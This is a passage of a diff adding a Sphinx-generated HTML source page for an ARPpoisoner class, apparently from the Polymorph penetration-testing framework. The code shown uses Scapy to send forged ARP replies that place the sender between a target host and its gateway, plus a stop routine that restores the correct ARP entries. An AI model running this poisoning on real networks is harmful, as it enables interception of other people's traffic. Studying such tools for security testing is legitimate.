+                        <span class="n">targetmac</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">resolve_target_mac</span><span class="p">(</span><span class="n">targetip</span><span class="p">)</span>
+
+                        <span class="k">if</span> <span class="n">targetmac</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span> 
+                            <span class="k">try</span><span class="p">:</span>
+                                <span class="c1">##log.debug(&quot;Poisoning {} &lt;-&gt; {}&quot;.format(targetip, self.gatewayip))</span>
+                                <span class="bp">self</span><span class="o">.</span><span class="n">s2</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">mymac</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">targetmac</span><span class="p">)</span><span class="o">/</span><span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">targetip</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">gatewayip</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="n">targetmac</span><span class="p">,</span> <span class="n">op</span><span class="o">=</span><span class="n">arpmode</span><span class="p">))</span>
+                                <span class="bp">self</span><span class="o">.</span><span class="n">s2</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">mymac</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">gatewaymac</span><span class="p">)</span><span class="o">/</span><span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">gatewayip</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">targetip</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">gatewaymac</span><span class="p">,</span> <span class="n">op</span><span class="o">=</span><span class="n">arpmode</span><span class="p">))</span>
+                            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Exception occurred while poisoning </span><span class="si">{}</span><span class="s2">: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">targetip</span><span class="p">,</span> <span class="n">e</span><span class="p">))</span>
+
+            <span class="n">sleep</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">interval</span><span class="p">)</span></div>
+
+<div class="viewcode-block" id="ARPpoisoner.stop"><a class="viewcode-back" href="../../../polymorph.spoofs.html#polymorph.spoofs.arpspoof.ARPpoisoner.stop">[docs]</a>    <span class="k">def</span> <span class="nf">stop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">send</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+        <span class="n">count</span> <span class="o">=</span> <span class="mi">2</span>
+
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">targets</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="c1">#log.info(&quot;Restoring subnet connection with {} packets&quot;.format(count))</span>
+            <span class="n">pkt</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">gatewaymac</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="s1">&#39;ff:ff:ff:ff:ff:ff&#39;</span><span class="p">)</span><span class="o">/</span><span class="n">ARP</span><span class="p">(</span><span class="n">hwsrc</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">gatewaymac</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">gatewayip</span><span class="p">,</span> <span class="n">op</span><span class="o">=</span><span class="s2">&quot;is-at&quot;</span><span class="p">)</span>
+            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">count</span><span class="p">):</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">s2</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pkt</span><span class="p">)</span>
+
+        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">targets</span><span class="p">:</span>
+            <span class="k">for</span> <span class="n">target</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">targets</span><span class="p">:</span>
+                <span class="n">targetip</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+                <span class="n">targetmac</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">resolve_target_mac</span><span class="p">(</span><span class="n">targetip</span><span class="p">)</span>
+
+                <span class="k">if</span> <span class="n">targetmac</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+                    <span class="c1">#log.info(&quot;Restoring connection {} &lt;-&gt; {} with {} packets per host&quot;.format(targetip, self.gatewayip, count))</span>
+                    <span class="k">try</span><span class="p">:</span>
+                        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">count</span><span class="p">):</span>
+                            <span class="bp">self</span><span class="o">.</span><span class="n">s2</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">targetmac</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="s1">&#39;ff:ff:ff:ff:ff:ff&#39;</span><span class="p">)</span><span class="o">/</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="s2">&quot;is-at&quot;</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">gatewayip</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">targetip</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="s2">&quot;ff:ff:ff:ff:ff:ff&quot;</span><span class="p">,</span> <span class="n">hwsrc</span><span class="o">=</span><span class="n">targetmac</span><span class="p">))</span>
+                            <span class="bp">self</span><span class="o">.</span><span class="n">s2</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">gatewaymac</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="s1">&#39;ff:ff:ff:ff:ff:ff&#39;</span><span class="p">)</span><span class="o">/</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="s2">&quot;is-at&quot;</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="n">targetip</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">gatewayip</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="s2">&quot;ff:ff:ff:ff:ff:ff&quot;</span><span class="p">,</span> <span class="n">hwsrc</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">gatewaymac</span><span class="p">))</span>
+                    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                        <span class="k">if</span> <span class="s2">&quot;Interrupted system call&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">e</span><span class="p">:</span>
+                           <span class="c1">#log.error(&quot;Exception occurred while poisoning {}: {}&quot;.format(targetip, e))</span>
+                            <span class="k">pass</span>
+
+        <span class="c1">#close the sockets</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">s2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></div></div>
+</pre></div>
+
+          </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper"><div class="relations">
+<h3>Related Topics</h3>
+<ul>
+  <li><a href="../../../index.html">Documentation overview</a><ul>
+  <li><a href="../../index.html">Module code</a><ul>
+  </ul></li>
+  </ul></li>
+</ul>
+</div>
+<div id="searchbox" style="display: none" role="search">
+  <h3>Quick search</h3>
+    <div class="searchformwrapper">
+    <form class="search" action="../../../search.html" method="get">
+      <input type="text" name="q" />
+      <input type="submit" value="Go" />
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+    </div>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="footer">
+      &copy;2018, Santiago Hernández.
+      
+      |
+      Powered by <a href="http://sphinx-doc.org/">Sphinx 1.7.2</a>
+      &amp; <a href="https://github.com/bitprophet/alabaster">Alabaster 0.7.10</a>
+      
+    </div>
+
+    
+
+    
+  </body>
+</html>
